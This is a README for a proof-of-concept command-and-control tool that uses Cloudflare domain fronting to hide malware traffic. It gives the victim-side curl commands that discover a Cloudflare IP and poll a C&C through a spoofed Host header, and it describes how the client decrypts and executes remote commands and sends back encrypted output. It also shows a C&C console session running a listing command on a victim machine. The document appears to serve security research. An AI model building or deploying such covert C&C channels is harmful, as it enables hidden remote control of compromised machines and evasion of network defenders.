# CloudFlare C&C POC
Before to start, let me say that I'm not a super expert on how to write a C&C client-server. This want to be a POC on how a Malware can hide behind a "fake" CloudFlare domain (see this post for more information: https://medium.com/@themiddleblue/cloudflare-domain-fronting-an-easy-way-to-reach-and-hide-a-malware-c-c-786255f0f437)

![](http://i.imgur.com/ZTsKokU.gif)

## How it work
The client, on the "Victim" PC, is a bash script that uses cURL to connect to CloudFlare and OpenSSL to encrypt all communications from and to CloudFlare/C&C. It simply make 2 HTTP request each *n* seconds: The first one, in order to discover a CloudFlare IP address, try to connect to a "real" CloudFlare website. The second one, make a fake request to CloudFlare to reach our C&C.

```bash
# get any usable CloudFlare IP address
CFIP=$(curl -v -I http://medium.com 2>&1 | egrep -o '\d+\.\d+\.\d+\.\d+' | head -1)

# get updates from my C&C
curl -H "Host: myfakedomain.com" "http://${CFIP}/?nocache=`date +%s`"
```

When the client receive an update, it decrypt the response_body and execute the command. Then it encrypt the command output and send it back to the C&C. The bash script uses OpenSSL to encrypt and decrypt.

![hiw](http://i.imgur.com/hYzqMWx.png)

## A dump of the client request
Following, a screenshot that shows how the client requests appear sniffing the http traffic on the victim PC.
![ws](http://i.imgur.com/ilVKfgV.png)

First, we have a CloudFlare IP `104.16.122.127` as a destination IP address:
```bash
$ whois 104.16.122.127
...
OrgName:        Cloudflare, Inc.
OrgId:          CLOUD14
Address:        101 Townsend Street
City:           San Francisco
StateProv:      CA
PostalCode:     94107
Country:        US
RegDate:        2010-07-09
Updated:        2017-02-17
Comment:        All Cloudflare abuse reporting can be done via https://www.cloudflare.com/abuse
Ref:            https://whois.arin.net/rest/org/CLOUD14
...
```

Then we see a POST request to `corriere.it` hostname (an italian daily newspaper), and in the request body we have the encrypted `ls -lart /tmp/` output.

## C&C Server
On the server side, you just need to configure a web server to reach the index.php script and to answer to all requests for the fake CloudFlare domain you choose. Then, you just need to execute the cc.php script:
```bash
root@theMiddle # php cc.php 
cmd: # list
Array
(
    [remoteserver] => Array
        (
            [lastseen] => 1502418263
            [ip] => 93.42.--.---
        )

)
cmd: #
cmd: # exec remoteserver: ls -lart /tmp/
> command sent, waiting for an answer.......
< total 92184
drwxr-xr-x@  6 root         wheel      204  5 Ott  2016 ..
-rw-r--r--   1 root         wheel        0  7 Ago 09:03 AlTest1.out
-rw-r--r--   1 root         wheel        0  7 Ago 09:03 AlTest1.err
drwx------   3 andreamenin  wheel      102  7 Ago 09:04 com.apple.launchd.uV6Rgp5yZb
drwx------   3 andreamenin  wheel      102  7 Ago 09:04 com.apple.launchd.HlZvBsVX2E
prw-rw-rw-   1 root         wheel        0  7 Ago 09:04 F7C71944B49B446081C0603DE90E4855_OUT
prw-rw-rw-   1 root         wheel        0  7 Ago 09:04 F7C71944B49B446081C0603DE90E4855_IN
-rw-r--r--   1 andreamenin  wheel        0  7 Ago 09:04 ExmanProcessMutex
srwx------   1 andreamenin  wheel        0  7 Ago 09:04 com.adobe.AdobeIPCBroker.ctrl-andreamenin
prw-rw-rw-   1 root         wheel        0  7 Ago 09:04 F91319AC-60C5-4073-9939-E9AD7C86611F_OUT
prw-rw-rw-   1 root         wheel        0  7 Ago 09:04 F91319AC-60C5-4073-9939-E9AD7C86611F_IN
-rw-rw-rw-@  1 andreamenin  wheel        0  7 Ago 09:04 .keystone_install_lock
drwxr-xr-x   2 andreamenin  wheel       68 10 Ago 10:02 E0EF0051-86D8-4E45-BDC5-28942C32B599
drwxr-xr-x   2 andreamenin  wheel       68 10 Ago 10:02 DC48AD0F-A69A-4F9C-AB96-FCB2657C5152
drwxr-xr-x   2 andreamenin  wheel       68 10 Ago 10:02 11DFEDB6-FD30-4238-B97D-9E7DDAE721D6
drwxr-xr-x   3 andreamenin  wheel      102 10 Ago 10:02 65410FB8-398C-4ED1-9CBB-E3CFE9275435
-rw-r--r--   1 root         wheel  2048000 10 Ago 18:07 wifi-08-10-2017__18:07:45.log
-rw-r--r--   1 root         wheel  2048000 10 Ago 18:07 wifi-08-10-2017__18:07:46.log
drwxrwxrwt  42 root         wheel     1428 11 Ago 04:12 .
cmd: #
cmd: #
```

## Info
What "Domain Fronting" is: https://en.wikipedia.org/wiki/Domain_fronting <br>
CloudFlare Domain Fronting: https://medium.com/@themiddleblue/cloudflare-domain-fronting-an-easy-way-to-reach-and-hide-a-malware-c-c-786255f0f437 <br>
theMiddle @twitter: https://twitter.com/Menin_TheMiddle <br>
